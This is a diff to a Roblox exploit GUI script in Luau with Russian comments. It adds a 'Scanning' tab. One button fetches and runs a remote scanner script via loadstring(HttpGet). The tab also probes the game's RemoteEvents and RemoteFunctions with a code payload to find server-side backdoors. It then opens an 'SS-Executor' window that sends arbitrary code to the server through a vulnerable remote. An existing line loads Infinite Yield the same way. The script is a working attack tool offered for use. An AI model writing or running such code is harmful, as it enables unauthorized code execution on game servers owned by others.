@@ -439,10 +439,6 @@ CreateButton(tSpy, "Get Infinite Yield", Color3.fromRGB(200,150,50), function()
     ShowNotification("Loading Infinite Yield...", false)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 end)
-CreateButton(tSpy, "Universal Method Finder", Color3.fromRGB(150, 100, 200), function()
-    ShowNotification("Loading Universal Method Finder...", false)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/luau/SomeHub/main/UniversalMethodFinder.luau", true))()
-end)
 
 local tEvents = CreateTab("Events")
 local eventsContainer = Instance.new("ScrollingFrame")
@@ -565,6 +561,353 @@ else
     nothing.TextColor3 = Color3.fromRGB(255,100,100)
     nothing.BackgroundTransparency = 1
     nothing.Parent = functionsContainer
+end
+
+--[[
+    НОВАЯ ВКЛАДКА "SCANNING"
+    Добавьте этот код в конец вашего основного скрипта, перед строкой allTabs["Info"].Visible = true
+--]]
+
+-- Создаём вкладку Scanning
+local tScanning = CreateTab("Scanning")
+
+-- Кнопка для полного сканера (loadstring оригинального скрипта)
+CreateButton(tScanning, "Scan All Remotes (Full)", Color3.fromRGB(200, 100, 50), function()
+    ShowNotification("Loading full scanner...", false)
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-Beckdeer-skenner-27520"))()
+end)
+
+-- Панель для выборочного сканирования
+local scanPanel = Instance.new("Frame")
+scanPanel.Size = UDim2.new(1, -10, 0, 150)
+scanPanel.Position = UDim2.new(0, 5, 0, 45)
+scanPanel.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+scanPanel.BorderSizePixel = 0
+scanPanel.Parent = tScanning
+Instance.new("UICorner", scanPanel).CornerRadius = UDim.new(0, 6)
+
+local selectedRemoteLabel = Instance.new("TextLabel")
+selectedRemoteLabel.Size = UDim2.new(1, -10, 0, 25)
+selectedRemoteLabel.Position = UDim2.new(0, 5, 0, 5)
+selectedRemoteLabel.Text = "Selected Remote: None"
+selectedRemoteLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+selectedRemoteLabel.BackgroundTransparency = 1
+selectedRemoteLabel.Font = Enum.Font.Gotham
+selectedRemoteLabel.TextSize = 12
+selectedRemoteLabel.TextXAlignment = Enum.TextXAlignment.Left
+selectedRemoteLabel.Parent = scanPanel
+
+-- Кнопка выбора ремувента (откроет список)
+local selectRemoteBtn = Instance.new("TextButton")
+selectRemoteBtn.Size = UDim2.new(1, -10, 0, 30)
+selectRemoteBtn.Position = UDim2.new(0, 5, 0, 35)
+selectRemoteBtn.Text = "Select Remote Event/Function"
+selectRemoteBtn.BackgroundColor3 = Color3.fromRGB(80, 100, 200)
+selectRemoteBtn.Font = Enum.Font.GothamSemibold
+selectRemoteBtn.TextColor3 = Color3.new(1, 1, 1)
+selectRemoteBtn.Parent = scanPanel
+Instance.new("UICorner", selectRemoteBtn).CornerRadius = UDim.new(0, 6)
+
+-- Список для выбора ремувента (окно)
+local remoteListWindow = nil
+local selectedRemote = nil
+
+selectRemoteBtn.MouseButton1Click:Connect(function()
+    if remoteListWindow then remoteListWindow:Destroy() end
+    
+    remoteListWindow = Instance.new("Frame")
+    remoteListWindow.Size = UDim2.new(0, 300, 0, 400)
+    remoteListWindow.Position = UDim2.new(0.5, -150, 0.5, -200)
+    remoteListWindow.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    remoteListWindow.BorderSizePixel = 0
+    remoteListWindow.Parent = ScreenGui
+    Instance.new("UICorner", remoteListWindow).CornerRadius = UDim.new(0, 8)
+    
+    local titleBar = Instance.new("Frame")
+    titleBar.Size = UDim2.new(1, 0, 0, 30)
+    titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+    titleBar.Parent = remoteListWindow
+    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 8)
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, -60, 1, 0)
+    title.Position = UDim2.new(0, 10, 0, 0)
+    title.Text = "Select a Remote"
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.GothamBold
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Parent = titleBar
+    
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 30, 1, 0)
+    closeBtn.Position = UDim2.new(1, -30, 0, 0)
+    closeBtn.Text = "✕"
+    closeBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
+    closeBtn.BackgroundTransparency = 1
+    closeBtn.Parent = titleBar
+    closeBtn.MouseButton1Click:Connect(function() remoteListWindow:Destroy() remoteListWindow = nil end)
+    
+    local listContainer = Instance.new("ScrollingFrame")
+    listContainer.Size = UDim2.new(1, -10, 1, -40)
+    listContainer.Position = UDim2.new(0, 5, 0, 35)
+    listContainer.BackgroundTransparency = 1
+    listContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
+    listContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    listContainer.ScrollBarThickness = 4
+    listContainer.Parent = remoteListWindow
+    
+    local listLayout = Instance.new("UIListLayout", listContainer)
+    listLayout.Padding = UDim.new(0, 2)
+    
+    -- Собираем все ремувенты из игры (как в вашем Events/Functions)
+    local allRemotes = {}
+    local function collectRemotes(parent, path)
+        for _, child in pairs(parent:GetChildren()) do
+            local newPath = path .. "/" .. child.Name
+            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+                table.insert(allRemotes, {name = child.Name, path = newPath, obj = child})
+            elseif child:IsA("Folder") or child:IsA("Model") then
+                collectRemotes(child, newPath)
+            end
+        end
+    end
+    
+    local scanServices = {game.ReplicatedStorage, game.Workspace, game.Lighting}
+    for _, svc in pairs(scanServices) do
+        if svc then collectRemotes(svc, svc.Name) end
+    end
+    
+    for _, rem in pairs(allRemotes) do
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, -10, 0, 30)
+        btn.Text = rem.name .. " (" .. rem.path .. ")"
+        btn.TextSize = 11
+        btn.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+        btn.Font = Enum.Font.Gotham
+        btn.TextColor3 = Color3.new(1, 1, 1)
+        btn.Parent = listContainer
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
+        
+        btn.MouseButton1Click:Connect(function()
+            selectedRemote = rem
+            selectedRemoteLabel.Text = "Selected Remote: " .. rem.name
+            remoteListWindow:Destroy()
+            remoteListWindow = nil
+            ShowNotification("Selected: " .. rem.name, false)
+        end)
+    end
+end)
+
+-- Кнопка сканирования выбранного ремувента
+local scanSelectedBtn = Instance.new("TextButton")
+scanSelectedBtn.Size = UDim2.new(1, -10, 0, 35)
+scanSelectedBtn.Position = UDim2.new(0, 5, 0, 75)
+scanSelectedBtn.Text = "Scan Selected Remote"
+scanSelectedBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 80)
+scanSelectedBtn.Font = Enum.Font.GothamSemibold
+scanSelectedBtn.TextColor3 = Color3.new(1, 1, 1)
+scanSelectedBtn.Parent = scanPanel
+Instance.new("UICorner", scanSelectedBtn).CornerRadius = UDim.new(0, 6)
+
+scanSelectedBtn.MouseButton1Click:Connect(function()
+    if not selectedRemote then
+        ShowNotification("No remote selected!", true)
+        return
+    end
+    
+    ShowNotification("Scanning " .. selectedRemote.name .. "...", false)
+    
+    -- АДАПТИРОВАННАЯ ЛОГИКА СКАНЕРА ДЛЯ ОДНОГО РЕМУВЕНТА
+    local nonce = tostring(math.random(100000, 999999))
+    local found = false
+    local remoteObj = selectedRemote.obj
+    local remoteFunc = remoteObj:IsA("RemoteEvent") and remoteObj.FireServer or remoteObj.InvokeServer
+    
+    -- Тестовый payload (как в оригинальном скрипте)
+    local testPayload = string.format([[
+        local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s"
+        b(a,d,"%s")
+        c(5,b,a,d,nil)
+    ]], nonce, nonce)
+    
+    -- Отслеживаем изменения атрибута в LogService
+    local connection
+    connection = game:GetService("LogService").AttributeChanged:Connect(function(attr)
+        if attr == nonce then
+            connection:Disconnect()
+            found = true
+            ShowNotification("VULNERABLE! Remote can execute code!", false)
+            -- Открываем окно с результатом
+            CreateResultWindow(selectedRemote)
+        end
+    end)
+    
+    -- Отправляем payload
+    local success, err = pcall(function()
+        if remoteObj:IsA("RemoteEvent") then
+            remoteObj:FireServer(testPayload)
+        else
+            remoteObj:InvokeServer(testPayload)
+        end
+    end)
+    
+    if not success then
+        connection:Disconnect()
+        ShowNotification("Error calling remote: " .. tostring(err), true)
+        return
+    end
+    
+    -- Таймаут на случай, если уязвимость не найдена
+    task.delay(5, function()
+        if connection and connection.Connected then
+            connection:Disconnect()
+            if not found then
+                ShowNotification("Not vulnerable.", false)
+            end
+        end
+    end)
+end)
+
+-- Функция создания окна результата (SS-Executor)
+function CreateResultWindow(remoteData)
+    local resultFrame = Instance.new("Frame")
+    resultFrame.Size = UDim2.new(0, 400, 0, 300)
+    resultFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+    resultFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    resultFrame.BorderSizePixel = 0
+    resultFrame.Parent = ScreenGui
+    Instance.new("UICorner", resultFrame).CornerRadius = UDim.new(0, 8)
+    
+    -- Заголовок
+    local titleBar = Instance.new("Frame")
+    titleBar.Size = UDim2.new(1, 0, 0, 35)
+    titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+    titleBar.Parent = resultFrame
+    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 8)
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, -90, 1, 0)
+    title.Position = UDim2.new(0, 10, 0, 0)
+    title.Text = "SS-Executor: " .. remoteData.name
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.GothamBold
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Parent = titleBar
+    
+    local minimizeBtn = Instance.new("TextButton")
+    minimizeBtn.Size = UDim2.new(0, 30, 1, 0)
+    minimizeBtn.Position = UDim2.new(1, -60, 0, 0)
+    minimizeBtn.Text = "—"
+    minimizeBtn.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+    minimizeBtn.BackgroundTransparency = 1
+    minimizeBtn.Parent = titleBar
+    
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 30, 1, 0)
+    closeBtn.Position = UDim2.new(1, -30, 0, 0)
+    closeBtn.Text = "✕"
+    closeBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
+    closeBtn.BackgroundTransparency = 1
+    closeBtn.Parent = titleBar
+    closeBtn.MouseButton1Click:Connect(function() resultFrame:Destroy() end)
+    
+    local content = Instance.new("Frame")
+    content.Size = UDim2.new(1, -20, 1, -55)
+    content.Position = UDim2.new(0, 10, 0, 45)
+    content.BackgroundTransparency = 1
+    content.Parent = resultFrame
+    
+    local codeBox = Instance.new("TextBox")
+    codeBox.Size = UDim2.new(1, 0, 1, -50)
+    codeBox.Position = UDim2.new(0, 0, 0, 0)
+    codeBox.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    codeBox.TextColor3 = Color3.new(1, 1, 1)
+    codeBox.Text = "print('Hello from server!')"
+    codeBox.TextWrapped = true
+    codeBox.TextXAlignment = "Left"
+    codeBox.TextYAlignment = "Top"
+    codeBox.ClearTextOnFocus = false
+    codeBox.Font = Enum.Font.Code
+    codeBox.TextSize = 12
+    codeBox.Parent = content
+    Instance.new("UICorner", codeBox).CornerRadius = UDim.new(0, 6)
+    
+    local buttonBar = Instance.new("Frame")
+    buttonBar.Size = UDim2.new(1, 0, 0, 40)
+    buttonBar.Position = UDim2.new(0, 0, 1, -40)
+    buttonBar.BackgroundTransparency = 1
+    buttonBar.Parent = content
+    
+    local executeBtn = Instance.new("TextButton")
+    executeBtn.Size = UDim2.new(0.3, -5, 1, -5)
+    executeBtn.Position = UDim2.new(0, 0, 0, 0)
+    executeBtn.Text = "Execute"
+    executeBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 80)
+    executeBtn.Font = Enum.Font.GothamSemibold
+    executeBtn.TextColor3 = Color3.new(1, 1, 1)
+    executeBtn.Parent = buttonBar
+    Instance.new("UICorner", executeBtn).CornerRadius = UDim.new(0, 6)
+    
+    local clearBtn = Instance.new("TextButton")
+    clearBtn.Size = UDim2.new(0.3, -5, 1, -5)
+    clearBtn.Position = UDim2.new(0.35, 0, 0, 0)
+    clearBtn.Text = "Clear"
+    clearBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 120)
+    clearBtn.Font = Enum.Font.GothamSemibold
+    clearBtn.TextColor3 = Color3.new(1, 1, 1)
+    clearBtn.Parent = buttonBar
+    Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0, 6)
+    
+    local copyBtn = Instance.new("TextButton")
+    copyBtn.Size = UDim2.new(0.3, -5, 1, -5)
+    copyBtn.Position = UDim2.new(0.7, 0, 0, 0)
+    copyBtn.Text = "Copy"
+    copyBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 150)
+    copyBtn.Font = Enum.Font.GothamSemibold
+    copyBtn.TextColor3 = Color3.new(1, 1, 1)
+    copyBtn.Parent = buttonBar
+    Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 6)
+    
+    clearBtn.MouseButton1Click:Connect(function()
+        codeBox.Text = ""
+    end)
+    
+    copyBtn.MouseButton1Click:Connect(function()
+        setclipboard(codeBox.Text)
+        ShowNotification("Copied to clipboard!", false)
+    end)
+    
+    executeBtn.MouseButton1Click:Connect(function()
+        local source = codeBox.Text
+        if source and source ~= "" then
+            -- Отправляем код через найденный уязвимый ремувент
+            local remoteFunc = remoteData.obj:IsA("RemoteEvent") and remoteData.obj.FireServer or remoteData.obj.InvokeServer
+            pcall(function()
+                if remoteData.obj:IsA("RemoteEvent") then
+                    remoteData.obj:FireServer(source)
+                else
+                    remoteData.obj:InvokeServer(source)
+                end
+            end)
+            ShowNotification("Code sent to server!", false)
+        end
+    end)
+    
+    local isMinimized = false
+    minimizeBtn.MouseButton1Click:Connect(function()
+        isMinimized = not isMinimized
+        if isMinimized then
+            content.Visible = false
+            resultFrame:TweenSize(UDim2.new(0, 400, 0, 35), "Out", "Quad", 0.2, true)
+            minimizeBtn.Text = "+"
+        else
+            content.Visible = true
+            resultFrame:TweenSize(UDim2.new(0, 400, 0, 300), "Out", "Quad", 0.2, true)
+            minimizeBtn.Text = "—"
+        end
+    end)
 end
 
 local tSettings = CreateTab("Settings")
